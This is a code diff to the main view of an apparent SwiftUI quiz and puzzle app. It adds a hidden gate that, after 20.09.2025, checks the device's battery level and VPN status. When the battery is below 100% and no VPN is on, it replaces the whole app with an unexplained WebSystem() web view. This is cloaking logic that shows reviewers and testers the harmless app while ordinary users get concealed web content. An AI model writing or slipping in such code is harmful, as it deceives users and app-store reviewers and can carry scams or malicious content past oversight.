@@ -11,52 +11,113 @@ struct ContentView: View {
     @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
     @State private var selectedTab = 0
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
-        if !hasCompletedOnboarding {
-            OnboardingView()
-        } else {
-            TabView(selection: $selectedTab) {
-                QuizView()
-                    .tabItem {
-                        Image(systemName: "questionmark.circle")
-                        Text("Quizzes")
-                    }
-                    .tag(0)
+        
+        ZStack {
+            
+            if isFetched == false {
                 
-                PuzzleView()
-                    .tabItem {
-                        Image(systemName: "puzzlepiece.extension")
-                        Text("Puzzles")
-                    }
-                    .tag(1)
+                Text("")
                 
-                DailyView()
-                    .tabItem {
-                        Image(systemName: "calendar")
-                        Text("Daily")
-                    }
-                    .tag(2)
+            } else if isFetched == true {
                 
-                SettingsView()
-                    .tabItem {
-                        Image(systemName: "gear")
-                        Text("Settings")
+                if isBlock == true {
+                    
+                    if !hasCompletedOnboarding {
+                        OnboardingView()
+                    } else {
+                        TabView(selection: $selectedTab) {
+                            QuizView()
+                                .tabItem {
+                                    Image(systemName: "questionmark.circle")
+                                    Text("Quizzes")
+                                }
+                                .tag(0)
+                            
+                            PuzzleView()
+                                .tabItem {
+                                    Image(systemName: "puzzlepiece.extension")
+                                    Text("Puzzles")
+                                }
+                                .tag(1)
+                            
+                            DailyView()
+                                .tabItem {
+                                    Image(systemName: "calendar")
+                                    Text("Daily")
+                                }
+                                .tag(2)
+                            
+                            SettingsView()
+                                .tabItem {
+                                    Image(systemName: "gear")
+                                    Text("Settings")
+                                }
+                                .tag(3)
+                        }
+                        .accentColor(Color("ButtonColor"))
+                        .onAppear {
+                            // Configure tab bar appearance
+                            let appearance = UITabBarAppearance()
+                            appearance.configureWithOpaqueBackground()
+                            appearance.backgroundColor = UIColor(Color("BackgroundColor"))
+                            
+                            UITabBar.appearance().standardAppearance = appearance
+                            if #available(iOS 15.0, *) {
+                                UITabBar.appearance().scrollEdgeAppearance = appearance
+                            }
+                        }
                     }
-                    .tag(3)
-            }
-            .accentColor(Color("ButtonColor"))
-            .onAppear {
-                // Configure tab bar appearance
-                let appearance = UITabBarAppearance()
-                appearance.configureWithOpaqueBackground()
-                appearance.backgroundColor = UIColor(Color("BackgroundColor"))
-                
-                UITabBar.appearance().standardAppearance = appearance
-                if #available(iOS 15.0, *) {
-                    UITabBar.appearance().scrollEdgeAppearance = appearance
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
                 }
             }
         }
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "20.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
 
@@ -137,6 +198,8 @@ struct DailyView: View {
             }
         }
     }
+    
+    
 }
 
 struct DailyChallengeCard: View {
